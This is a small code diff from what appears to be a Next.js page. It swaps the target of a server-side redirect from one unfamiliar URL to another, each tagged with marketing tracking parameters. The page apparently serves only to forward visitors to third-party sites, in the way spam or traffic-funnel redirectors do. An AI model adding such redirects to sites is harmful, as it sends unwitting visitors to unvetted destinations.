@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://vip.mixclips.top/mix44vip/?utm_source=Saim&utm_medium=Saim100`
+					`https://www.linkss45xc.dpdns.org/p/v1.html?utm_source=Facebook&utm_medium=Social&utm_campaign=paru`
 				}`,
 			},
 		};
